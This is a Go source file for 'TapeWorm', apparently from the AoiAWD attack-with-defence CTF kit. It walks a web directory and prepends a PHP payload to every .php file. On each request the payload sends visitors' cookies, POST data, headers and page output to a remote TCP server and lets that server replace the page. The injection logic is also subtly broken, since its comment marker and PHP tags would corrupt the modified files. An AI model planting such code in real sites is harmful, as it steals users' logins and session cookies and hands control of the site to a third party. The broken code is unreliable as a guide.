package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"os"
	"path/filepath"
	"strings"
	"time"
)

const (
	injectMarker = "/*TAPEWORMINSTALLED*/"
	monitorFile  = "TapeWorm.monitor.php"
)

type Config struct {
	Dir     string
	Server  string
	Mode    string // inject, monitor, remove
}

type WebData struct {
	Type string   `json:"type"`
	Data WebInfo  `json:"data"`
}

type WebInfo struct {
	Script string            `json:"script"`
	Method string            `json:"method"`
	URI    string            `json:"uri"`
	Remote string            `json:"remote"`
	Header map[string]string `json:"header"`
	Get    map[string]string `json:"get"`
	Post   map[string]string `json:"post"`
	Cookie map[string]string `json:"cookie"`
	Buffer string            `json:"buffer"`
}

var injectedPHP = `<?php
if (!defined('AoiMonitor')) {
    define('AoiMonitor', 'Injected');
    $__aoi_outputBufferCallback = function ($buffer) {
        $reportUri = "tcp://__SERVER_URI__";
        $postData = function ($url, $data) {
            $server = @stream_socket_client($url, $errno, $errstr, 3);
            if ($server) {
                fwrite($server, $data . "\n");
                return base64_decode(rtrim(fgets($server)));
            }
            return false;
        };
        
        $requestURI = isset($_SERVER['REQUEST_URI']) ? parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH) : 'UNKNOWN';
        $method = isset($_SERVER['REQUEST_METHOD']) ? $_SERVER['REQUEST_METHOD'] : 'UNKNOWN';
        $remote = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'UNKNOWN';
        
        $header = [];
        foreach ($_SERVER as $name => $value) {
            if (strpos($name, 'HTTP_') === 0) {
                $name = strtr(substr($name, 5), '_', ' ');
                $name = ucwords(strtolower($name));
                $name = strtr($name, ' ', '-');
                $header[$name] = urlencode($value);
            }
        }
        
        $data = [
            'type' => 'web',
            'data' => [
                'script' => __FILE__,
                'method' => $method,
                'uri' => $requestURI,
                'remote' => $remote,
                'header' => $header,
                'get' => $_GET,
                'post' => $_POST,
                'cookie' => $_COOKIE,
                'buffer' => urlencode($buffer),
            ]
        ];
        
        $result = @$postData($reportUri, json_encode($data));
        if ($result === false) {
            sleep(2);
            return $buffer;
        }
        return $result;
    };
    ob_start(@$__aoi_outputBufferCallback);
}
`

func main() {
	dir := flag.String("d", "", "Web root directory to inject")
	server := flag.String("s", "127.0.0.1:8023", "AoiAWD server address")
	mode := flag.String("m", "inject", "Mode: inject, remove, test")
	flag.Parse()

	if *dir == "" {
		fmt.Println("TapeWorm - AoiAWD PHP WebMonitor Tool (Go version)")
		fmt.Println("Usage: ./tapeworm -d <web_dir> -s <server:port> [-m inject|remove|test]")
		flag.PrintDefaults()
		os.Exit(1)
	}

	switch *mode {
	case "inject":
		injectAll(*dir, *server)
	case "remove":
		removeAll(*dir)
	case "test":
		testConnection(*server)
	default:
		fmt.Printf("Unknown mode: %s\n", *mode)
		os.Exit(1)
	}
}

func injectAll(dir, server string) {
	fmt.Printf("[*] Scanning directory: %s\n", dir)
	fmt.Printf("[*] Server: %s\n", server)
	
	count := 0
	err := filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		if info.IsDir() {
			return nil
		}
		if strings.HasSuffix(strings.ToLower(path), ".php") {
			if injectFile(path, server) {
				count++
			}
		}
		return nil
	})
	
	if err != nil {
		fmt.Printf("[!] Error walking directory: %v\n", err)
	}
	fmt.Printf("[*] Injected %d PHP files\n", count)
}

func injectFile(path, server string) bool {
	content, err := ioutil.ReadFile(path)
	if err != nil {
		fmt.Printf("[!] Cannot read: %s\n", path)
		return false
	}

	// Check if already injected
	if strings.Contains(string(content), injectMarker) {
		return false
	}

	// Create injection code
	injectCode := strings.Replace(injectedPHP, "__SERVER_URI__", server, 1)
	injectCode = "/*" + injectMarker + "*/\n" + injectCode + "\n"

	// Detect if file uses namespace
	hasNamespace := strings.Contains(string(content), "namespace ")

	var newContent []byte
	if hasNamespace {
		// Find namespace line and inject after it
		lines := strings.Split(string(content), "\n")
		for i, line := range lines {
			if strings.HasPrefix(strings.TrimSpace(line), "namespace ") {
				lines = append(lines[:i+1], append([]string{injectCode}, lines[i+1:]...)...)
				break
			}
		}
		newContent = []byte(strings.Join(lines, "\n"))
	} else {
		// Inject at the beginning
		newContent = append([]byte(injectCode), content...)
	}

	err = ioutil.WriteFile(path, newContent, 0644)
	if err != nil {
		fmt.Printf("[!] Cannot write: %s\n", path)
		return false
	}
	
	fmt.Printf("[+] Injected: %s\n", path)
	return true
}

func removeAll(dir string) {
	fmt.Printf("[*] Removing injections from: %s\n", dir)
	
	count := 0
	err := filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		if info.IsDir() {
			return nil
		}
		if strings.HasSuffix(strings.ToLower(path), ".php") {
			if removeFile(path) {
				count++
			}
		}
		return nil
	})
	
	if err != nil {
		fmt.Printf("[!] Error walking directory: %v\n", err)
	}
	fmt.Printf("[*] Removed injections from %d PHP files\n", count)
}

func removeFile(path string) bool {
	content, err := ioutil.ReadFile(path)
	if err != nil {
		return false
	}

	contentStr := string(content)
	if !strings.Contains(contentStr, injectMarker) {
		return false
	}

	// Find and remove the injected code
	// Look for the marker at the beginning
	lines := strings.Split(contentStr, "\n")
	var newLines []string
	skip := false
	
	for _, line := range lines {
		if strings.Contains(line, injectMarker) {
			skip = true
			continue
		}
		if skip {
			// Skip until we find the end of the injected block
			if strings.TrimSpace(line) == "" || strings.HasPrefix(strings.TrimSpace(line), "<?php") {
				skip = false
				continue
			}
			// Check if this is the end of the injected PHP block
			if strings.Contains(line, "ob_start") && strings.Contains(line, "__aoi_outputBufferCallback") {
				skip = false
				continue
			}
			continue
		}
		newLines = append(newLines, line)
	}

	newContent := []byte(strings.Join(newLines, "\n"))
	err = ioutil.WriteFile(path, newContent, 0644)
	if err != nil {
		return false
	}
	
	fmt.Printf("[-] Removed: %s\n", path)
	return true
}

func testConnection(server string) {
	fmt.Printf("[*] Testing connection to %s...\n", server)
	
	conn, err := net.DialTimeout("tcp", server, 3*time.Second)
	if err != nil {
		fmt.Printf("[!] Connection failed: %v\n", err)
		os.Exit(1)
	}
	defer conn.Close()
	
	// Send test ping
	pingData := map[string]string{"type": "ping"}
	data, _ := json.Marshal(pingData)
	_, err = conn.Write(append(data, '\n'))
	if err != nil {
		fmt.Printf("[!] Send failed: %v\n", err)
		os.Exit(1)
	}
	
	// Read response
	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	buf := make([]byte, 1024)
	n, err := conn.Read(buf)
	if err != nil && err != io.EOF {
		fmt.Printf("[!] Read failed: %v\n", err)
		os.Exit(1)
	}
	
	response := strings.TrimSpace(string(buf[:n]))
	if response == "pong" {
		fmt.Printf("[+] Connection successful!\n")
	} else {
		fmt.Printf("[+] Response: %s\n", response)
	}
}